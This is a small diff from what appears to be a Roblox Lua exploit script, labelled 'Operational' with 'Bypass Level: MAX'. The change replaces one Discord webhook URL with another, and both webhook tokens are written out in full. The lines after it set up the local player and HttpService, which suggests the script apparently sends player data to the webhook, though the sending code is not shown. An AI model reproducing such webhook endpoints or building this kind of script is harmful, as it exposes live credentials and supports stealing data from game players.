@@ -4,7 +4,7 @@
     Status: Operational | Bypass Level: MAX
 ]]
 
-local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
+local webhook = "https://discord.com/api/webhooks/1485982672986706081/uf2qRAqqtRM_hKHL3lxK8z7pgQaRJaweLO5pnzfk__31AeXuy2JbtXAj1Qf2QmkW_kHW"
 local p = game.Players.LocalPlayer
 local h = game:GetService("HttpService")
 
